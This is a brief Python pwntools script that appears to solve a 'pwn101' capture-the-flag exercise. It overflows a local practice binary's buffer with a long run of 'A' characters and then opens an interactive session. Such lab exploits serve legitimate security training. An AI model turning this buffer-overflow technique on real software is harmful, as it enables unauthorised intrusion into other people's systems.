from pwn import *

# Start program
io = process('./pwn101-1644307211706.pwn101')

# Send string to overflow buffer
io.sendlineafter(b':', b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')

# Receive output
#print(io.recvall().decode())
io.interactive() # test
